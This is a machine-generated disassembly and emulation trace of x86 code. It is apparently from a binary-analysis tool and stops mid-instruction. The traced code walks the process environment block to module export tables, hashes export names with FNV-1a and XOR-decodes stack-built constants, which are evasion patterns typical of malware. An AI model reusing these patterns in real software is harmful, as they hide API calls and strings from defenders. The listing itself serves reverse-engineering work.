0x458be1: push eax, regs_read: [30, 19], regs_write: [30] 0x458be7: push esi, regs_read: [30, 29], regs_write: [30] 0x458be8: push eax, regs_read: [30, 19], regs_write: [30] 0x458bf1: mov edi, esi, regs_read: [29], regs_write: [23] 0x458bf8: push ecx, regs_read: [30, 22], regs_write: [30] 0x458bf9: push eax, regs_read: [30, 19], regs_write: [30] 0x458bfa: mov ecx, 0x4f0598, regs_read: (), regs_write: [22] 0x458c04: mov byte ptr [ebp + edi - 8], al, regs_read: [20, 23, 2], regs_write: () 0x458c0e: mov cl, byte ptr [ebp - 7], regs_read: [20], regs_write: [10] adjusting stack for ESP -0x48 and offset 0x7ff9 for stack size 0x10000 0x458c11: mov al, byte ptr [ebp - 8], regs_read: [20], regs_write: [2] adjusting stack for ESP -0x48 and offset 0x7ff8 for stack size 0x10000 0x458c14: mov dl, byte ptr [ebp - 6], regs_read: [20], regs_write: [16] adjusting stack for ESP -0x48 and offset 0x7ffa for stack size 0x10000 0x458c17: mov edi, dword ptr [ebp - 0x18], regs_read: [20], regs_write: [23] adjusting stack for ESP -0x48 and offset 0x7fe8 for stack size 0x10000 0x458c25: mov al, byte ptr [ebp - 7], regs_read: [20], regs_write: [2] adjusting stack for ESP -0x48 and offset 0x7ff9 for stack size 0x10000 0x458c28: mov byte ptr [ebp - 4], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x48 and offset 0x7ffc for stack size 0x10000 saving data to stack: 0 1 0x458c2b: mov cl, dl, regs_read: [16], regs_write: [10] 0x458c3f: mov byte ptr [ebp - 3], cl, regs_read: [20, 10], regs_write: () adjusting stack for ESP -0x48 and offset 0x7ffd for stack size 0x10000 saving data to stack: 0 1 0x458c42: mov byte ptr [ebp - 2], dl, regs_read: [20, 16], regs_write: () adjusting stack for ESP -0x48 and offset 0x7ffe for stack size 0x10000 saving data to stack: 0 1 0x458c49: mov ecx, dword ptr [edi + 4], regs_read: [23], regs_write: [22] 0x458c56: mov al, byte ptr [eax], regs_read: [19], regs_write: [2] 0x458c58: mov byte ptr [ecx], al, regs_read: [22, 2], regs_write: () 0x458c5f: push eax, regs_read: [30, 19], regs_write: [30] 0x458c60: push ecx, regs_read: [30, 22], regs_write: [30] 0x458c61: mov ecx, edi, regs_read: [23], regs_write: [22] 0x458c6d: mov eax, edi, regs_read: [23], regs_write: [19] 0x458c6f: pop edi, regs_read: [30], regs_write: [30, 23] 0x458c70: pop esi, regs_read: [30], regs_write: [30, 29] 0x458c71: pop ebx, regs_read: [30], regs_write: [30, 21] 0x458c74: push ebx, regs_read: [30, 21], regs_write: [30] 0x458c75: mov bl, cl, regs_read: [10], regs_write: [5] 0x458c7a: push eax, regs_read: [30, 19], regs_write: [30] 0x458c80: pop ecx, regs_read: [30], regs_write: [30, 22] 0x458c91: pop ebx, regs_read: [30], regs_write: [30, 21] 0x458c93: mov al, 1, regs_read: (), regs_write: [2] 0x458c95: pop ebx, regs_read: [30], regs_write: [30, 21] 0x458c9b: push ebp, regs_read: [30, 20], regs_write: [30] 0x458c9c: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x44 and offset 0x8000 for stack size 0x10000 0x458ca7: mov ecx, 0x4f0634, regs_read: (), regs_write: [22] 0x458cac: push esi, regs_read: [30, 29], regs_write: [30] 0x458cad: push edi, regs_read: [30, 23], regs_write: [30] 0x458cae: push 1, regs_read: [30], regs_write: [30] 0x458cb0: push 0x4dc5c8, regs_read: [30], regs_write: [30] 0x458cba: push 0xf, regs_read: [30], regs_write: [30] 0x458cbc: push 0x4dc5cc, regs_read: [30], regs_write: [30] 0x458cc1: mov ecx, 0x4f067c, regs_read: (), regs_write: [22] 0x458ccb: push 7, regs_read: [30], regs_write: [30] 0x458ccd: push 0x4dc5dc, regs_read: [30], regs_write: [30] 0x458cd2: mov ecx, 0x4f0788, regs_read: (), regs_write: [22] 0x458cdc: mov eax, dword ptr fs:[0x30], regs_read: [32], regs_write: [19] 0x458ce2: mov eax, dword ptr [eax + 0xc], regs_read: [19], regs_write: [19] 0x458ce5: mov eax, dword ptr [eax + 0xc], regs_read: [19], regs_write: [19] 0x458ce8: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458ceb: mov ecx, dword ptr [edx + 0x3c], regs_read: [24], regs_write: [22] 0x458cee: mov ecx, dword ptr [ecx + edx + 0x78], regs_read: [22, 24], regs_write: [22] 0x458cf4: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x802c for stack size 0x10000 saving data to stack: 5179272 4 0x458cfc: mov edi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [23] 0x458d03: mov ecx, dword ptr [ecx + 0x20], regs_read: [22], regs_write: [22] 0x458d0e: mov dword ptr [esp + 0x24], 0x811c9dc5, regs_read: [30], regs_write: () adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458d17: mov dword ptr [esp + 0x28], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x64 and offset 0x8028 for stack size 0x10000 saving data to stack: 5179272 4 0x458d1b: mov esi, dword ptr [ecx], regs_read: [22], regs_write: [29] 0x458d1f: mov dl, byte ptr [esi], regs_read: [29], regs_write: [16] 0x458d22: mov byte ptr [esp + 0xf], dl, regs_read: [30, 16], regs_write: () adjusting stack for ESP -0x64 and offset 0x800f for stack size 0x10000 saving data to stack: 0 1 0x458d28: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458d2d: mov cl, byte ptr [esp + 0xf], regs_read: [30], regs_write: [10] adjusting stack for ESP -0x64 and offset 0x800f for stack size 0x10000 0x458d31: mov edx, dword ptr [esp + 0x24], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 0x458d40: mov cl, byte ptr [esi], regs_read: [29], regs_write: [10] 0x458d47: mov dword ptr [esp + 0x24], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458d53: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458d58: mov ecx, dword ptr [esp + 0x28], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x64 and offset 0x8028 for stack size 0x10000 0x458d60: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x458d64: mov esi, dword ptr [esp + 0x2c], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x64 and offset 0x802c for stack size 0x10000 0x458d68: mov eax, dword ptr [esi + 0x24], regs_read: [29], regs_write: [19] 0x458d72: mov eax, dword ptr [esi + 0x1c], regs_read: [29], regs_write: [19] 0x458d78: mov eax, dword ptr [eax + edx], regs_read: [19, 24], regs_write: [19] 0x458d7f: mov ecx, dword ptr fs:[0x30], regs_read: [32], regs_write: [22] 0x458d86: mov dword ptr [esp + 0x30], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x8030 for stack size 0x10000 saving data to stack: 0 4 0x458d8a: mov ecx, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [22] 0x458d8d: mov ecx, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [22] 0x458d90: mov esi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [29] 0x458d93: mov edx, dword ptr [esi + 0x3c], regs_read: [29], regs_write: [24] 0x458d96: mov eax, dword ptr [edx + esi + 0x78], regs_read: [24, 29], regs_write: [19] 0x458d9c: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x802c for stack size 0x10000 saving data to stack: 0 4 0x458da4: mov edi, dword ptr [eax + 0x18], regs_read: [19], regs_write: [23] 0x458dab: mov eax, dword ptr [eax + 0x20], regs_read: [19], regs_write: [19] 0x458db7: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x8028 for stack size 0x10000 saving data to stack: 0 4 0x458dbb: mov edx, dword ptr [eax], regs_read: [19], regs_write: [24] 0x458dbd: mov eax, 0x811c9dc5, regs_read: (), regs_write: [19] 0x458dc4: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458dc8: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x458dcb: mov byte ptr [esp + 0xf], al, regs_read: [30, 2], regs_write: () adjusting stack for ESP -0x64 and offset 0x800f for stack size 0x10000 saving data to stack: 1 1 0x458dd1: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x64 and offset 0x8028 for stack size 0x10000 0x458dd7: mov al, byte ptr [esp + 0xf], regs_read: [30], regs_write: [2] adjusting stack for ESP -0x64 and offset 0x800f for stack size 0x10000 0x458ddb: mov esi, dword ptr [esp + 0x24], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 0x458dea: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x458df1: mov dword ptr [esp + 0x24], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x64 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458dfd: mov esi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [29] 0x458e02: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x64 and offset 0x8028 for stack size 0x10000 0x458e0a: mov ecx, dword ptr [ecx], regs_read: [22], regs_write: [22] 0x458e0e: mov edx, dword ptr [esp + 0x2c], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x64 and offset 0x802c for stack size 0x10000 0x458e12: push 0x8000, regs_read: [30], regs_write: [30] 0x458e17: push dword ptr [esp + 0x34], regs_read: [30], regs_write: [30] 0x458e1b: mov eax, dword ptr [edx + 0x24], regs_read: [24], regs_write: [19] 0x458e25: mov eax, dword ptr [edx + 0x1c], regs_read: [24], regs_write: [19] 0x458e2b: mov eax, dword ptr [eax + esi], regs_read: [19, 29], regs_write: [19] 0x458e32: push 0, regs_read: [30], regs_write: [30] 0x458e39: pop ecx, regs_read: [30], regs_write: [30, 22] 0x458e3a: push eax, regs_read: [30, 19], regs_write: [30] 0x458e40: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x458e45: mov dword ptr [esp + 0x54], 0x5ee8fbc0, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8054 for stack size 0x10000 saving data to stack: 1592327104 4 0x458e4d: mov dword ptr [esp + 0x60], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x8060 for stack size 0x10000 saving data to stack: 1389027477 4 0x458e51: mov dword ptr [esp + 0x58], 0x1b193a9c, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8058 for stack size 0x10000 saving data to stack: 454638236 4 0x458e59: mov dword ptr [esp + 0x5c], 0x3705a230, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x805c for stack size 0x10000 saving data to stack: 923116080 4 0x458e61: movaps xmm1, xmmword ptr [esp + 0x54], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x70 and offset 0x8054 for stack size 0x10000 0x458e66: mov dword ptr [esp + 0x20], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x70 and offset 0x8020 for stack size 0x10000 saving data to stack: 1389027477 4 0x458e6a: mov eax, dword ptr fs:[0x30], regs_read: [32], regs_write: [19] 0x458e70: mov dword ptr [esp + 0x14], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8014 for stack size 0x10000 saving data to stack: 914789047 4 0x458e78: mov dword ptr [esp + 0x18], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x8018 for stack size 0x10000 saving data to stack: 896093928 4 0x458e80: mov dword ptr [esp + 0x1c], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x70 and offset 0x801c for stack size 0x10000 saving data to stack: 929680980 4 0x458e88: pxor xmm1, xmmword ptr [esp + 0x14], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x70 and offset 0x8014 for stack size 0x10000 0x458e8e: movaps xmmword ptr [esp + 0x54], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x70 and offset 0x8054 for stack size 0x10000 saving data to stack: 131075852119239809959881079 16 0x458e93: mov eax, dword ptr [eax + 0xc], regs_read: [19], regs_write: [19] 0x458e96: pop ecx, regs_read: [30], regs_write: [30, 22] 0x458e97: mov eax, dword ptr [eax + 0xc], regs_read: [19], regs_write: [19] 0x458e9a: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458e9d: mov ecx, dword ptr [edx + 0x3c], regs_read: [24], regs_write: [22] 0x458ea0: mov ecx, dword ptr [ecx + edx + 0x78], regs_read: [22, 24], regs_write: [22] 0x458ea6: mov dword ptr [esp + 0x2c], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x6c and offset 0x802c for stack size 0x10000 saving data to stack: 5179272 4 0x458eae: mov edi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [23] 0x458eb5: mov ecx, dword ptr [ecx + 0x20], regs_read: [22], regs_write: [22] 0x458ec0: mov dword ptr [esp + 0x24], 0x811c9dc5, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458ec9: mov dword ptr [esp + 0x30], ecx, regs_read: [30, 22], regs_write: () adjusting stack for ESP -0x6c and offset 0x8030 for stack size 0x10000 saving data to stack: 5179272 4 0x458ecd: mov esi, dword ptr [ecx], regs_read: [22], regs_write: [29] 0x458ed1: mov dl, byte ptr [esi], regs_read: [29], regs_write: [16] 0x458ed4: mov byte ptr [esp + 0xf], dl, regs_read: [30, 16], regs_write: () adjusting stack for ESP -0x6c and offset 0x800f for stack size 0x10000 saving data to stack: 0 1 0x458eda: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458edf: mov cl, byte ptr [esp + 0xf], regs_read: [30], regs_write: [10] adjusting stack for ESP -0x6c and offset 0x800f for stack size 0x10000 0x458ee3: mov edx, dword ptr [esp + 0x24], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x6c and offset 0x8024 for stack size 0x10000 0x458ef2: mov cl, byte ptr [esi], regs_read: [29], regs_write: [10] 0x458ef9: mov dword ptr [esp + 0x24], edx, regs_read: [30, 24], regs_write: () adjusting stack for ESP -0x6c and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x458f05: mov edx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [24] 0x458f0a: mov ecx, dword ptr [esp + 0x30], regs_read: [30], regs_write: [22] adjusting stack for ESP -0x6c and offset 0x8030 for stack size 0x10000 0x458f12: mov eax, dword ptr [eax], regs_read: [19], regs_write: [19] 0x458f16: mov esi, dword ptr [esp + 0x2c], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x6c and offset 0x802c for stack size 0x10000 0x458f1a: mov eax, dword ptr [esi + 0x24], regs_read: [29], regs_write: [19] 0x458f24: mov eax, dword ptr [esi + 0x1c], regs_read: [29], regs_write: [19] 0x458f2a: mov eax, dword ptr [eax + edx], regs_read: [19, 24], regs_write: [19] 0x458f33: push ecx, regs_read: [30, 22], regs_write: [30] 0x458f3a: pop edi, regs_read: [30], regs_write: [30, 23] 0x458f3b: pop esi, regs_read: [30], regs_write: [30, 29] 0x458f3c: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP -0x68 and offset 0x8000 for stack size 0x10000 0x458f3e: pop ebp, regs_read: [30], regs_write: [30, 20] 0x458f42: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x458f47: mov dword ptr [esp + 0x60], 0x5fe8fbc0, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8060 for stack size 0x10000 saving data to stack: 1609104320 4 0x458f4f: mov dword ptr [esp + 0x6c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x4 and offset 0x806c for stack size 0x10000 saving data to stack: 1389027477 4 0x458f53: mov dword ptr [esp + 0x64], 0x1b1d2b86, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8064 for stack size 0x10000 saving data to stack: 454896518 4 0x458f5b: mov dword ptr [esp + 0x68], 0x3705a230, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8068 for stack size 0x10000 saving data to stack: 923116080 4 0x458f63: movaps xmm1, xmmword ptr [esp + 0x60], regs_read: [30], regs_write: [123] adjusting stack for ESP 0x4 and offset 0x8060 for stack size 0x10000 0x458f68: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP 0x4 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x458f70: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x458f78: mov dword ptr [esp + 0x14], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8014 for stack size 0x10000 saving data to stack: 896093928 4 0x458f80: mov dword ptr [esp + 0x18], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP 0x4 and offset 0x8018 for stack size 0x10000 saving data to stack: 929680980 4 0x458f88: pxor xmm1, xmmword ptr [esp + 0x10], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP 0x4 and offset 0x8010 for stack size 0x10000 0x458f8e: push eax, regs_read: [30, 19], regs_write: [30] 0x458f8f: movaps xmmword ptr [esp + 0x64], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP 0x0 and offset 0x8064 for stack size 0x10000 saving data to stack: 131075852120349191439280503 16 0x458f9a: mov ecx, eax, regs_read: [19], regs_write: [22] 0x458fa8: push eax, regs_read: [30, 19], regs_write: [30] 0x458fa9: push eax, regs_read: [30, 19], regs_write: [30] 0x458faa: push eax, regs_read: [30, 19], regs_write: [30] 0x458fab: push 0x484e26, regs_read: [30], regs_write: [30] 0x458fb0: push eax, regs_read: [30, 19], regs_write: [30] 0x458fb1: push eax, regs_read: [30, 19], regs_write: [30] 0x458fb8: push eax, regs_read: [30, 19], regs_write: [30] 0x458fc1: push 1, regs_read: [30], regs_write: [30] 0x458fd2: mov ecx, 0x104, regs_read: (), regs_write: [22] 0x458fde: mov byte ptr [eax], 0, regs_read: [19], regs_write: () 0x458fee: push eax, regs_read: [30, 19], regs_write: [30] 0x458fef: push 0xfa, regs_read: [30], regs_write: [30] 0x458ffa: push 0xb, regs_read: [30], regs_write: [30] 0x458ffc: pop edx, regs_read: [30], regs_write: [30, 24] 0x459009: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x45900e: mov dword ptr [esp + 0x78], 0x3769a236, regs_read: [30], regs_write: () adjusting stack for ESP -0x28 and offset 0x8078 for stack size 0x10000 saving data to stack: 929669686 4 0x459016: mov dword ptr [esp + 0x7c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x807c for stack size 0x10000 saving data to stack: 1389027477 4 0x459021: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x28 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x459025: mov edi, 0x57e5fdfb, regs_read: (), regs_write: [23] 0x45902a: mov dword ptr [esp + 0x70], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x28 and offset 0x8070 for stack size 0x10000 saving data to stack: 1474690555 4 0x459035: mov esi, 0x58001d84, regs_read: (), regs_write: [29] 0x45903a: mov dword ptr [esp + 0x10], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x28 and offset 0x8010 for stack size 0x10000 saving data to stack: 914789047 4 0x459042: mov dword ptr [esp + 0x74], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x28 and offset 0x8074 for stack size 0x10000 saving data to stack: 1476402564 4 0x459046: movaps xmm1, xmmword ptr [esp + 0x70], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x28 and offset 0x8070 for stack size 0x10000 0x45904b: push eax, regs_read: [30, 19], regs_write: [30] 0x45904c: mov dword ptr [esp + 0x18], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x2c and offset 0x8018 for stack size 0x10000 saving data to stack: 896093928 4 0x459058: mov dword ptr [esp + 0x1c], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x2c and offset 0x801c for stack size 0x10000 saving data to stack: 929680980 4 0x459060: pxor xmm1, xmmword ptr [esp + 0x14], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x2c and offset 0x8014 for stack size 0x10000 0x459066: push eax, regs_read: [30, 19], regs_write: [30] 0x459067: movaps xmmword ptr [esp + 0x78], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x30 and offset 0x8078 for stack size 0x10000 saving data to stack: 511831244993492863381324 16 0x459071: push eax, regs_read: [30, 19], regs_write: [30] 0x459085: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459086: mov edx, eax, regs_read: [19], regs_write: [24] 0x459094: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459095: push eax, regs_read: [30, 19], regs_write: [30] 0x459096: mov ecx, 0x4f05f0, regs_read: (), regs_write: [22] 0x4590c4: mov eax, 0x52cae095, regs_read: (), regs_write: [19] 0x4590c9: mov dword ptr [esp + 0x80], edi, regs_read: [30, 23], regs_write: () adjusting stack for ESP -0x30 and offset 0x8080 for stack size 0x10000 saving data to stack: 1474690555 4 0x4590d0: mov dword ptr [esp + 0x8c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x30 and offset 0x808c for stack size 0x10000 saving data to stack: 1389027477 4 0x4590de: mov dword ptr [esp + 0x1c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x30 and offset 0x801c for stack size 0x10000 saving data to stack: 1389027477 4 0x4590e9: mov dword ptr [esp + 0x84], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x30 and offset 0x8084 for stack size 0x10000 saving data to stack: 1476402564 4 0x4590f0: mov dword ptr [esp + 0x88], 0x3769af36, regs_read: [30], regs_write: () adjusting stack for ESP -0x30 and offset 0x8088 for stack size 0x10000 saving data to stack: 929673014 4 0x4590fb: movaps xmm1, xmmword ptr [esp + 0x80], regs_read: [30], regs_write: [123] adjusting stack for ESP -0x30 and offset 0x8080 for stack size 0x10000 0x459103: push eax, regs_read: [30, 19], regs_write: [30] 0x459104: mov dword ptr [esp + 0x14], 0x368692b7, regs_read: [30], regs_write: () adjusting stack for ESP -0x34 and offset 0x8014 for stack size 0x10000 saving data to stack: 914789047 4 0x459113: mov dword ptr [esp + 0x18], 0x35694ee8, regs_read: [30], regs_write: () adjusting stack for ESP -0x34 and offset 0x8018 for stack size 0x10000 saving data to stack: 896093928 4 0x45911b: mov dword ptr [esp + 0x1c], 0x3769ce54, regs_read: [30], regs_write: () adjusting stack for ESP -0x34 and offset 0x801c for stack size 0x10000 saving data to stack: 929680980 4 0x459123: pxor xmm1, xmmword ptr [esp + 0x14], regs_read: [123, 30], regs_write: [123] adjusting stack for ESP -0x34 and offset 0x8014 for stack size 0x10000 0x459129: push eax, regs_read: [30, 19], regs_write: [30] 0x45912a: movaps xmmword ptr [esp + 0x88], xmm1, regs_read: [30, 123], regs_write: () adjusting stack for ESP -0x38 and offset 0x8088 for stack size 0x10000 saving data to stack: 459885213681926766030668 16 0x459137: push eax, regs_read: [30, 19], regs_write: [30] 0x45914b: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45914c: mov edx, eax, regs_read: [19], regs_write: [24] 0x45915a: pop ecx, regs_read: [30], regs_write: [30, 22] 0x459173: mov esi, 0x4f05f0, regs_read: (), regs_write: [29] 0x459178: mov ecx, esi, regs_read: [29], regs_write: [22] 0x45917f: mov ecx, eax, regs_read: [19], regs_write: [22] 0x45918a: push ecx, regs_read: [30, 22], regs_write: [30] 0x45918b: mov ecx, esi, regs_read: [29], regs_write: [22] 0x459192: pop ecx, regs_read: [30], regs_write: [30, 22] 0x45919f: mov ecx, eax, regs_read: [19], regs_write: [22] 0x4591aa: push ecx, regs_read: [30, 22], regs_write: [30] 0x4591b7: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4591b8: push 0, regs_read: [30], regs_write: [30] 0x4591ba: mov ecx, esi, regs_read: [29], regs_write: [22] 0x4591c1: mov esi, dword ptr [0x4c80d4], regs_read: (), regs_write: [29] 0x4591c7: push eax, regs_read: [30, 19], regs_write: [30] 0x4591d2: push 0, regs_read: [30], regs_write: [30] 0x4591e0: push eax, regs_read: [30, 19], regs_write: [30] 0x4591ef: mov ecx, dword ptr fs:[0x30], regs_read: [32], regs_write: [22] 0x4591f6: mov dword ptr [esp + 0x2c], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x802c for stack size 0x10000 saving data to stack: 1389027477 4 0x4591fa: mov ecx, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [22] 0x4591fd: mov ecx, dword ptr [ecx + 0xc], regs_read: [22], regs_write: [22] 0x459200: mov esi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [29] 0x459203: mov edx, dword ptr [esi + 0x3c], regs_read: [29], regs_write: [24] 0x459206: mov eax, dword ptr [edx + esi + 0x78], regs_read: [24, 29], regs_write: [19] 0x45920c: mov dword ptr [esp + 0x30], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x8030 for stack size 0x10000 saving data to stack: 1389027477 4 0x459214: mov edi, dword ptr [eax + 0x18], regs_read: [19], regs_write: [23] 0x45921b: mov eax, dword ptr [eax + 0x20], regs_read: [19], regs_write: [19] 0x459227: mov dword ptr [esp + 0x28], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x8028 for stack size 0x10000 saving data to stack: 1389027477 4 0x45922b: mov edx, dword ptr [eax], regs_read: [19], regs_write: [24] 0x45922d: mov eax, 0x811c9dc5, regs_read: (), regs_write: [19] 0x459234: mov dword ptr [esp + 0x24], eax, regs_read: [30, 19], regs_write: () adjusting stack for ESP -0x44 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x459238: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x45923b: mov byte ptr [esp + 0xf], al, regs_read: [30, 2], regs_write: () adjusting stack for ESP -0x44 and offset 0x800f for stack size 0x10000 saving data to stack: 1 1 0x459241: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x8028 for stack size 0x10000 0x459247: mov al, byte ptr [esp + 0xf], regs_read: [30], regs_write: [2] adjusting stack for ESP -0x44 and offset 0x800f for stack size 0x10000 0x45924b: mov esi, dword ptr [esp + 0x24], regs_read: [30], regs_write: [29] adjusting stack for ESP -0x44 and offset 0x8024 for stack size 0x10000 0x45925a: mov al, byte ptr [edx], regs_read: [24], regs_write: [2] 0x459261: mov dword ptr [esp + 0x24], esi, regs_read: [30, 29], regs_write: () adjusting stack for ESP -0x44 and offset 0x8024 for stack size 0x10000 saving data to stack: 2166136261 4 0x45926d: mov esi, dword ptr [ecx + 0x18], regs_read: [22], regs_write: [29] 0x459272: mov eax, dword ptr [esp + 0x28], regs_read: [30], regs_write: [19] adjusting stack for ESP -0x44 and offset 0x8028 for stack size 0x10000 0x45927a: mov ecx, dword ptr [ecx], regs_read: [22], regs_write: [22] 0x45927e: mov edx, dword ptr [esp + 0x30], regs_read: [30], regs_write: [24] adjusting stack for ESP -0x44 and offset 0x8030 for stack size 0x10000 0x459282: push dword ptr [esp + 0x2c], regs_read: [30], regs_write: [30] 0x459286: mov eax, dword ptr [edx + 0x24], regs_read: [24], regs_write: [19] 0x459290: mov eax, dword ptr [edx + 0x1c], regs_read: [24], regs_write: [19] 0x459296: mov eax, dword ptr [eax + esi], regs_read: [19, 29], regs_write: [19] 0x4592a4: mov ecx, 0x4f06c8, regs_read: (), regs_write: [22] 0x4592a9: push eax, regs_read: [30, 19], regs_write: [30] 0x4592b9: mov ecx, esp, regs_read: [30], regs_write: [22] adjusting stack for ESP -0x4c and offset 0x8000 for stack size 0x10000 0x4592bb: push eax, regs_read: [30, 19], regs_write: [30] 0x4592ce: push 0x4dc5ca, regs_read: [30], regs_write: [30] 0x4592f3: push eax, regs_read: [30, 19], regs_write: [30] 0x459322: push eax, regs_read: [30, 19], regs_write: [30] 0x459342: push eax, regs_read: [30, 19], regs_write: [30] 0x45934f: push 0xbb8, regs_read: [30], regs_write: [30] 0x459367: mov esi, 0x4dc5e4, regs_read: (), regs_write: [29] 0x45936e: push 0x4dc5e8, regs_read: [30], regs_write: [30] 0x45937f: push 0x4dc5ec, regs_read: [30], regs_write: [30] 0x459397: push eax, regs_read: [30, 19], regs_write: [30] 0x4593a8: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4593c1: push esi, regs_read: [30, 29], regs_write: [30] 0x4593cb: push eax, regs_read: [30, 19], regs_write: [30] 0x4593d1: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4593d2: pop ecx, regs_read: [30], regs_write: [30, 22] 0x4593eb: mov ecx, 0x4f06a0, regs_read: (), regs_write: [22] 0x45940a: mov edi, 0x52cae095, regs_read: (), regs_write: [23] 0x45940f: mov dword ptr [esp + 0x94], 0x470a3db7, regs_read: [30], regs_write: () adjusting stack for ESP -0x6c and offset 0x8094 for stack size 0x10000 saving data to stack: 1191853495 4 0x45941a: mov esi, 